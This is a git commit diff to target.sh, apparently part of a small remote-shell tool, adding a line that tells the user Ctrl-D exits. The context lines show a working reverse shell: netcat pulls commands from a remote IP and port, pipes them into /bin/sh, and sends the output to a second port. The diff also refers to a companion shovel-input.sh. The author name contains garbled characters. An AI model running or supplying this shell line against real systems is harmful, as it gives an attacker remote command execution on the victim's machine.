aa70f8b052b7f46dbff969a26a9af06327e689ff
ꓛ㇜ay <cwells@cwells.org>
2017-09-26 19:45:08 -0400

    Adding instruction to exit "properly"

--- target.sh
+++ target.sh
@@ -6,6 +6,7 @@ PORT1=$2
 PORT2=$3
 
 echo "[*] Now enter commands in the terminal running shovel-input.sh"
+echo "[*] Ctrl-D to exit"
 echo "=============================================================="
 nc -vn $IPv4 $PORT1 | /bin/sh | nc -vn $IPv4 $PORT2 > /tmp/foo.bar
 
